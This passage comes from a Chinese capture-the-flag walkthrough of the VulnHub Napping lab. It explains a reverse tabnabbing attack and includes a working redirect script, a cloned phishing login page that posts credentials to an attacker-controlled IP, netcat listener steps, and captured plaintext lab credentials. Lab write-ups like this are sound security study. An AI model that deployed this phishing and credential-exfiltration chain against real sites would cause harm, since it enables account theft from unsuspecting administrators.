+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>Starting gobuster in directory enumeration <span style="color:#79c0ff">mode</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>/server-status        <span style="color:#ff7b72;font-weight:bold">(</span>Status: 403<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 280<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>Progress: <span style="color:#a5d6ff">220558</span> / <span style="color:#a5d6ff">220558</span> <span style="color:#ff7b72;font-weight:bold">(</span>100.00%<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span><span style="color:#79c0ff">Finished</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span></span></span></code></pre></div><h3 id="232网页探索完整代码与思路">2.3.2网页探索（完整代码与思路）<a class="anchor" href="#232%e7%bd%91%e9%a1%b5%e6%8e%a2%e7%b4%a2%e5%ae%8c%e6%95%b4%e4%bb%a3%e7%a0%81%e4%b8%8e%e6%80%9d%e8%b7%af">#</a></h3>
+<p>注册账户1，密码123456
+获得信息：在一个博客推广界面，要求提交自定义链接🔗，链接将由网站的管理员审核
+<code>F12</code>查看信息，输入<code>https://baidu.com/</code>并提交，发现生成一个指向百度的超链接且在其代码中发现<code>a</code>标签中只有<code>target=_blank</code>，而没有用<code>rel=&quot;noopener/noreferrer&quot;</code>属性，当使用<code>target=&quot;_blank&quot;</code>打开新页面时，新页面可以通过JavaScript的<code>window.opener</code>访问原页面的控制权</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>&lt;<span style="color:#7ee787">p</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>Thank you for your submission, you have entered: &lt;<span style="color:#7ee787">a</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;https://www.baidu.com&#34;</span> target<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;_blank&#34;</span>&gt;Here&lt;/<span style="color:#7ee787">a</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>&lt;/<span style="color:#7ee787">p</span>&gt;</span></span></code></pre></div><p>因此这里可能存在<code>Tabnabbing</code>漏洞（钓鱼攻击），可以制作恶意界面<code>evil.html</code>，让管理员账户登录到恶意界面，获取管理员账户信息</p>
+<p><code>upfine.html</code>代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>&lt;<span style="color:#7ee787">html</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>&lt;<span style="color:#7ee787">body</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>    &lt;<span style="color:#7ee787">script</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>        <span style="color:#ff7b72">if</span>(window.opener) window.opener.parent.location.replace(<span style="color:#a5d6ff">&#39;http://192.168.203.129:6688/get_info.html&#39;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>        <span style="color:#ff7b72">if</span>(window.opener  <span style="color:#ff7b72;font-weight:bold">!=</span> window) window.opener.parent.location.replace(<span style="color:#a5d6ff">&#39;http://192.168.203.129:6688/get_info.html&#39;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">7</span><span>    &lt;/<span style="color:#7ee787">script</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">8</span><span>&lt;/<span style="color:#7ee787">body</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">9</span><span>&lt;/<span style="color:#7ee787">html</span>&gt;</span></span></code></pre></div><ul>
+<li><code>window.opener</code>指的是打开房前<code>upfine.html</code>页面的母页面</li>
+<li><code>window.opener.parent.location.replace()</code>作用是让母页面的URL强制跳转到攻击者指定的地址，<code>http://192.168.174.131:6688/get_info.html</code>，使用<code>replace</code>而非<code>href</code>是为了不留下浏览器后退历史，更隐蔽</li>
+<li>不直接发<code>get_info.html</code>，如果直接发送钓鱼页面，管理员可能察觉到URL异常，通过<code>upfine.html</code>做一次跨窗口控制，可以更隐蔽篡改管理员已经打开的标签页，这种技术是<code>Tabnabbing</code>(标签页劫持)</li>
+</ul>
+<p>退出到登录界面，检查源代码并复制，生成<code>get_info.html</code>，代码如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span><span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>&lt;<span style="color:#7ee787">html</span> lang<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>&lt;<span style="color:#7ee787">head</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>    &lt;<span style="color:#7ee787">meta</span> charset<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>    &lt;<span style="color:#7ee787">title</span>&gt;Login&lt;/<span style="color:#7ee787">title</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>    &lt;<span style="color:#7ee787">link</span> rel<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;stylesheet&#34;</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>    &lt;<span style="color:#7ee787">style</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>        <span style="color:#7ee787">body</span>{ <span style="color:#ff7b72">font</span>: <span style="color:#a5d6ff">14</span><span style="color:#ff7b72">px</span> <span style="color:#79c0ff">sans-serif</span>; }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>        .<span style="color:#f0883e;font-weight:bold">wrapper</span>{ <span style="color:#ff7b72">width</span>: <span style="color:#a5d6ff">360</span><span style="color:#ff7b72">px</span>; <span style="color:#ff7b72">padding</span>: <span style="color:#a5d6ff">20</span><span style="color:#ff7b72">px</span>; }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>    &lt;/<span style="color:#7ee787">style</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>&lt;/<span style="color:#7ee787">head</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>&lt;<span style="color:#7ee787">body</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>    &lt;<span style="color:#7ee787">div</span> class<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;wrapper&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>        &lt;<span style="color:#7ee787">h2</span>&gt;Login&lt;/<span style="color:#7ee787">h2</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>        &lt;<span style="color:#7ee787">p</span>&gt;Please fill in your credentials to login.&lt;/<span style="color:#7ee787">p</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>        &lt;<span style="color:#7ee787">form</span> action<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;index.php&#34;</span> method<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;post&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>            &lt;<span style="color:#7ee787">div</span> class<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;form-group&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>                &lt;<span style="color:#7ee787">label</span>&gt;Username&lt;/<span style="color:#7ee787">label</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>                &lt;<span style="color:#7ee787">input</span> type<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;text&#34;</span> name<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;username&#34;</span> class<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;form-control &#34;</span> value<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>                &lt;<span style="color:#7ee787">span</span> class<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;invalid-feedback&#34;</span>&gt;&lt;/<span style="color:#7ee787">span</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>            &lt;/<span style="color:#7ee787">div</span>&gt;    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>            &lt;<span style="color:#7ee787">div</span> class<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;form-group&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span>                &lt;<span style="color:#7ee787">label</span>&gt;Password&lt;/<span style="color:#7ee787">label</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span>                &lt;<span style="color:#7ee787">input</span> type<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;password&#34;</span> name<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;password&#34;</span> class<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;form-control &#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span>                &lt;<span style="color:#7ee787">span</span> class<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;invalid-feedback&#34;</span>&gt;&lt;/<span style="color:#7ee787">span</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span>            &lt;/<span style="color:#7ee787">div</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span>            &lt;<span style="color:#7ee787">div</span> class<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;form-group&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">28</span><span>                &lt;<span style="color:#7ee787">input</span> type<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;submit&#34;</span> class<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;btn btn-primary&#34;</span> value<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;Login&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">29</span><span>            &lt;/<span style="color:#7ee787">div</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">30</span><span>            &lt;<span style="color:#7ee787">p</span>&gt;Don&#39;t have an account? &lt;<span style="color:#7ee787">a</span> href<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;register.php&#34;</span>&gt;Sign up now&lt;/<span style="color:#7ee787">a</span>&gt;.&lt;/<span style="color:#7ee787">p</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">31</span><span>        &lt;/<span style="color:#7ee787">form</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">32</span><span>    &lt;/<span style="color:#7ee787">div</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">33</span><span>&lt;/<span style="color:#7ee787">body</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">34</span><span>&lt;/<span style="color:#7ee787">html</span>&gt;</span></span></code></pre></div><p>将两个文件放入一个文件夹内<code>/home/kali/Desktop/vulnhub/napping-1.0.1/</code>，接着<code>python -m http.server 80</code>，<code>-m</code>是<code>module-name</code>，<code>http.server</code>是python内置的标准库模块，运行后，当前文件夹中的所有文件都会通过网络暴露出来，</p>
+<p>再开启对<code>6688</code>端口的监听<code>nc -lvvp 6688</code>，然后将<code>http://192.168.174.131/upfine.html</code>地址进行提交，监听窗口获得账户名和密码：</p>
+<p>结果我提交后毫无反应，接着url直接输入<code>http://192.168.174.131/get_info.html</code>，并输入账户密码，看看<code>get_info.html</code>网页有没有问题，结果突然出现如下信息，<strong>但是</strong>，只成功一次，无法复刻！！：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ nc -lvvp <span style="color:#a5d6ff">6688</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">6688</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>192.168.174.135: inverse host lookup failed: Unknown host
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>192.168.174.131<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>192.168.174.135<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">37374</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>POST /get_info.html HTTP/1.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>Host: 192.168.174.131:6688
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>User-Agent: python-requests/2.22.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>Accept: */*
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>Content-Length: <span style="color:#a5d6ff">45</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>daniel&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>C%40ughtm3napping123 sent 0, rcvd <span style="color:#a5d6ff">279</span></span></span></code></pre></div><p>接着，再次提交<code>http://192.168.174.131</code>，触发<code>index.html</code>，按键后触发<code>upfine.html</code>，同样弹出信息</p>
+<h3 id="233-重做思路简化代码">2.3.3 重做思路（简化代码）<a class="anchor" href="#233-%e9%87%8d%e5%81%9a%e6%80%9d%e8%b7%af%e7%ae%80%e5%8c%96%e4%bb%a3%e7%a0%81">#</a></h3>
+<p>文件1<code>upfine.html</code>攻击引导页</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>&lt;<span style="color:#7ee787">script</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>    <span style="color:#ff7b72">if</span> (window.opener) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>        <span style="color:#8b949e;font-style:italic">// 确保 IP 替换为你 Kali 现在的真实 IP
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>        window.opener.location.replace(<span style="color:#a5d6ff">&#39;http://192.168.203.129:6688/get_info.html&#39;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>&lt;/<span style="color:#7ee787">script</span>&gt;</span></span></code></pre></div><ul>
+<li><code>window.opener</code>，如果当前窗口是由另一个窗口打开的，<code>window.opener</code>返回那个窗口的引用；如果当前窗口不是由其他窗口打开的，则该属性返回<code>null</code></li>
+<li><code>if (window.opener)</code>，检查<em>当前页面</em>是否是由<em>另一个页面</em>通过链接（且带有<code>target=&quot;_blank&quot;</code>属性）打开的</li>
+<li><code>window.opener.location</code>能获取并控制父窗口的URL</li>
+<li><code>.replace('钓鱼URL')</code>将父窗口重定向到指定的钓鱼页面，这里不使用<code>href</code>，因为<code>replace</code>能从浏览器的历史记录中删除原页面，意味着受害者即使怀疑并点后退，也无法回到原本的合法页面</li>
+</ul>
+<p>文件2<code>get_info.html</code>（钓鱼页面）</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>&lt;<span style="color:#7ee787">form</span> action<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;http://192.168.203.129:6688/capture&#34;</span> method<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;post&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>    &lt;<span style="color:#7ee787">input</span> type<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;text&#34;</span> name<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;username&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>    &lt;<span style="color:#7ee787">input</span> type<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;password&#34;</span> name<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;password&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>    &lt;<span style="color:#7ee787">input</span> type<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;submit&#34;</span> value<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;Login&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>&lt;/<span style="color:#7ee787">form</span>&gt;</span></span></code></pre></div><p>部署与操作：</p>
+<ol>
+<li>将2个文件放在kali的同一个目录下</li>
+<li>在终端进入目录，启动python服务器，<code>sudo python3 -m http.server 80</code></li>
+<li>启动nc监听（接收密码），<code>nc -lvvp 6688</code></li>
+<li>在靶机表单提交<code>http://192.168.203.129/upfine.html</code></li>
+<li>观察<code>nc</code>命令窗口，约1分钟能看到数据</li>
+</ol>
+<p>得到信息如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/vulnhub/vulnhub_napping_1.0.1<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ sudo python3 -m http.server <span style="color:#a5d6ff">80</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>Serving HTTP on 0.0.0.0 port <span style="color:#a5d6ff">80</span> <span style="color:#ff7b72;font-weight:bold">(</span>http://0.0.0.0:80/<span style="color:#ff7b72;font-weight:bold">)</span> ...
